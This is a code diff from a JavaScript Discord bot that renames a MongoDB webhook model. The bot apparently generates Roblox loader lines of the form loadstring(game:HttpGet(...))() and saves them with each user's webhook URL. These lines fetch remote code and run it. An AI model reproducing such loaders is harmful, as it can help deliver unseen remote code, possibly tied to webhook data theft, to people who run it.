@@ -317,12 +317,12 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
             const userName = interaction.user.username;
             // Génération de l'ID unique pour la base de données
             let webhookUuid = generateWebhookId();
-            let webhookDoc = await WebHookIdSchema.findOne({ url: webhookUrl });
+            let webhookDoc = await WebHookId.findOne({ url: webhookUrl });
 
             if (webhookDoc) {
                 webhookUuid = webhookDoc.webhookId;
             } else {
-                webhookDoc = new WebHookIdSchema({
+                webhookDoc = new WebHookId({
                     webhookId: webhookUuid,
                     url: webhookUrl,
                     userId: userId,
@@ -360,7 +360,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyS
             // 6. Préparation du résultat final
             const finalLoadstring = `loadstring(game:HttpGet("${pasteUrl}", true))()`;
             // 2. Sauvegarde en Base de données (MongoDB)
-            await WebHookIdSchema.updateOne(
+            await WebHookId.updateOne(
                 { webhookId: webhookUuid },
                 { $push: { script: finalLoadstring } }
             );
